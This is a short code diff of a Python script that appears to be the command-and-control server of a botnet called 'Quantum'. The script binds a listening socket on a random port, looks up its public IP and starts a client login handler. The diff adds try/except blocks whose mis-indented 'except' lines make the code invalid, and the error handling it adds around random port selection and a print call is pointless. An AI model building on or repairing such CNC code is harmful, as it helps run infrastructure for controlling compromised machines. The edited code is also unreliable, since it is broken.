@@ -37,11 +37,13 @@ from assets.Commands.admin import *
 #         print("This is currently for LINUX!")
 #         exit()
 
-
 buffer_length = 1024
 host = "0.0.0.0"
-port = random.randint(0, 65535)
-timenow = datetime.datetime.now() # current time
+try:
+        port = random.randint(0, 65535)
+        timenow = datetime.datetime.now() # current time
+       except:
+        print("[X] Error! Error binding port.")
 if len(sys.argv) == 2:
         if sys.argv[1] == "-on":
                 host = requests.get("https://api.ipify.org").text
@@ -51,7 +53,10 @@ sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Try To Reuse Port B
 sock.bind((host, port))
 sock.listen()
 
-print(f"Quantum Started | {host} | {port}")
+try:
+        print(f"Quantum Started | {host} | {port}")
+       except:
+        print("[X] Error! Error starting cnc. Are you connected to the internet?")
 
 def handle_connection(client, addr):
         utils.set_Title(client, "Login")
